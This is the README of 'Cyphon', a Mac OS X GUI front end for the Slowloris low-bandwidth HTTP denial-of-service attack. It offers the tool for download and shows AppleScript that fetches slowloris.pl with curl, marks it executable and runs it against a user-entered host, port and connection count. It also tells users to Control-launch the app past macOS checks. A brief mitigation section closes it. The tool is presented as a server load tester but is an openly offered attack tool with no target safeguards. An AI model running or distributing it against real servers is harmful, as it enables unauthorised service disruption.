# Cyphon

A very simple yet powerful Low Bandwidth DoS (Denial of Service) tool written for Mac OS X (Friendly GUI) based on RSnake's Slow Loris.

You can use this tool to test for DoS vulnerabilities on your server or to experiment it's potential. 

# Built with
* Xcode - Cocoa, Applescript

# Code Example
```AppleScript
 do script "mkdir -p ~/Source && cd ~/Source/"
 do script "curl -O https://raw.githubusercontent.com/abila5h/Cyphon-DoS/master/slowloris.pl" in window 1
 do script "chmod +x slowloris.pl" in window 1
 do script "./slowloris.pl -dns  " & currentTextFieldText & " -port "  & portFieldText &  " -timeout " &timeoutFieldText & " -num "& packetFieldText in window 1
```


# Motivation

I decided to code an executable OSX version for Mac OS users as there are little server load testers out there for Mac OS.

SlowLoris seemed to be the best solution for a Mac DoS tool due to its ability of being a low bandwidth yet poisonous HTTP client by using a single IP address to send several partial HTTP requests.

[Wikipedia](https://en.wikipedia.org/wiki/Slowloris_(computer_security))

# Screenshots
![1](http://i.imgur.com/gIIcJnY.png)
![2](http://i.imgur.com/43L87Gw.png)
![3](http://i.imgur.com/km4R9V7.png)

# Download and demonstration

[Download](https://github.com/abila5h/Cyphon-DoS/blob/master/Cyphon.zip?raw=true) - Hold down the Control key when launching the Application.


# Mitigating the attacks 

* Use DDoS mitigation services 

     [Project Shield](https://projectshield.withgoogle.com/public/) - Google's Free DDoS mitigation Service

* Increase the number of clients your server can host.

# Contributors 
* [Abilash](http://abilashmenon.com)
* [RSnake](http://twitter.com/RSnake)
